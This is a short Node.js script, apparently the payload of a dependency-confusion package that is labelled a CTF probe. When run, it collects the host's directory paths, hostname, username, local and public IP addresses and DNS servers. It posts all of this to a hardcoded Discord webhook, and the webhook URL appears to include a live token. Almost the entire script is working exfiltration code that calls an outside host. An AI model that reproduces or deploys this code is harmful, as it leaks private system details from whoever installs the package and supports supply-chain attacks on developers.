const os = require('os');
const https = require('https');
const dns = require('dns');

const discordWebhookUrl = 'https://discord.com/api/webhooks/1193495191710089256/gbP4D1WCBOymeyH8Dk3wU0hQAn7KkeQcdJybmtWCRC3bQKCHpDM6bEGzox_Gn3OA-BDv'; 


function sendMessage(message) {
    const payload = JSON.stringify({ content: message });
    const parsedUrl = new URL(discordWebhookUrl);
    const req = https.request({
        hostname: parsedUrl.hostname,
        path: parsedUrl.pathname,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(payload)
        }
    });
    req.write(payload);
    req.end();
}

https.get('https://ipinfo.io/ip', (resp) => {
    let data = '';
    resp.on('data', (chunk) => { data += chunk; });
    resp.on('end', () => {
        const baseMessage = `Alert: CTF Dependency Confusion Attack Detected!
Current Directory: ${__dirname}
Home Directory: ${os.homedir()}
Hostname: ${os.hostname()}
Username: ${os.userInfo().username}
Local IP Address: ${(os.networkInterfaces()['eth0'] || [{ address: 'N/A' }])[0].address}
Public IP Address: ${data.trim()}
Dns-Server: ${dns.getServers().join(', ')}`;

        sendMessage(baseMessage);
    });
}).on("error", (err) => {
    sendMessage(`Error fetching public IP: ${err.message}`);
});
